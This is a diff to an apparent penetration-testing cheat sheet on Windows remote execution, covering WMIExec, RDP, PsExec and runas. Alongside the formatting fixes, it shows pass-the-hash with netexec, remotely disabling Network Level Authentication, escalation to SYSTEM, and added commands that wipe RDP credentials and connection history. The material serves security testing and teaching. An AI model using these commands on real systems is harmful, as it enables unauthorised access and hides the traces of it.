@@ -22,7 +22,7 @@
 * [WinRM Protocol](#winrm-protocol)
 * [WMI Protocol](#wmi-protocol)
 * [Other Methods](#other-methods)
-    * [PsExec - Sysinternal](#psexec---sysinternal)
+    * [PsExec - Sysinternals](#psexec---sysinternals)
     * [Mount a remote share](#mount-a-remote-share)
     * [Run as another user](#run-as-another-user)
 
@@ -209,7 +209,11 @@ Alternatively you can use the fork [ThePorgs/impacket](https://github.com/ThePor
 ### WMIExec
 
 Use a non default share `-share SHARE` to write the output to reduce the detection.
-By default this command is executed : `cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__RANDOM 2>&1`
+By default this command is executed:
+
+```ps1
+cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__RANDOM 2>&1
+```
 
 ### SMBExec
 
@@ -259,7 +263,7 @@ class RemoteShell(cmd.Cmd):
     root@payload$ netexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
     ```
 
-* Fix CredSSP errors
+* Fix **CredSSP** errors
 
     ```ps1
     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
@@ -274,14 +278,47 @@ class RemoteShell(cmd.Cmd):
     netexec rdp 10.10.10.10 -u user -p pass --nla-screenshot
     ```
 
-* Disable NLA
+* Disable Network Level Authentication (NLA)
 
     ```ps1
     PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
     PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
     ```
 
-Abuse RDP protocol to execute commands remotely with the following commands;
+On Windows, the native Remote Desktop client is `mstsc.exe`.
+When launched with the `/public` switch, RDP runs in Public Mode, which uses temporary, non-persistent session settings.
+
+```ps1
+mstsc /public /v:server01
+```
+
+Public Mode is designed for shared systems, jump hosts, and security-sensitive environments, where leaving local artifacts or cached credentials would present an operational risk.
+
+When RDP is launched in Public Mode, the client will:
+
+* Not save credentials
+* Not use cached credentials
+* Not save connection history
+* Not load local RDP settings (printers, drives, clipboard, etc.)
+* Not store passwords in Credential Manager
+
+If RDP was launched without /public, local artifacts may persist.
+These can be manually removed using the following PowerShell commands.
+
+```ps1
+# Remove Stored RDP Credentials
+cmdkey /list | ? { $_ -Match "TERMSRV/" } | % { $_ -Replace ".*: " } | % { cmdkey /delete:$_ }
+
+# Remove Cached Bitmaps and Client Data
+Remove-Item -Path "$Env:LocalAppData\Microsoft\Terminal Server Client\Cache" -Recurse -ErrorAction SilentlyContinue
+
+# Remove RDP Connection History and Device Mappings
+Remove-Item -Path "HKCU:\Software\Microsoft\Terminal Server Client\Default" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "HKCU:\Software\Microsoft\Terminal Server Client\LocalDevices" -Recurse -Force -ErrorAction SilentlyContinue
+```
+
+Abuse RDP protocol to execute commands remotely with the following commands:
 
 * [Pennyw0rth/netexec](https://github.com/Pennyw0rth/NetExec)
 
@@ -414,21 +451,28 @@ PS C:\> wmic /node:target.domain /user:domain\user /password:password process ca
 
 ## Other Methods
 
-### PsExec - Sysinternal
+### PsExec - Sysinternals
 
-From Windows - [Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
+From Windows - [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)
 
 ```powershell
-PS C:\> PsExec.exe  \\srv01.domain.local -u DOMAIN\username -p password cmd.exe
+PsExec.exe  \\srv01.domain.local -u DOMAIN\username -p password cmd.exe
 
 # switch admin user to NT Authority/System
-PS C:\> PsExec.exe  \\srv01.domain.local -u DOMAIN\username -p password cmd.exe -s 
+PsExec.exe  \\srv01.domain.local -u DOMAIN\username -p password cmd.exe -s 
+```
+
+Sysinternals can be installed using the Windows Package Manager or downloaded from [live.sysinternals.com](https://live.sysinternals.com/).
+
+```ps1
+winget install --id Microsoft.Sysinternals.Suite
+winget install Microsoft.sysinternals --accept-source-agreements --accept-package-agreements 
 ```
 
 ### Mount a remote share
 
 ```powershell
-PS C:\> net use \\srv01.domain.local /user:DOMAIN\username password C$
+net use \\srv01.domain.local /user:DOMAIN\username password C$
 ```
 
 ### Run as another user
@@ -437,8 +481,8 @@ Runas is a command-line tool that is built into Windows Vista.
 Allows a user to run specific tools and programs with different permissions than the user's current logon provides.
 
 ```powershell
-PS C:\> runas /netonly /user:DOMAIN\username "cmd.exe"
-PS C:\> runas /noprofil /netonly /user:DOMAIN\username cmd.exe
+runas /netonly /user:DOMAIN\username "cmd.exe"
+runas /noprofil /netonly /user:DOMAIN\username cmd.exe
 ```
 
 ## References
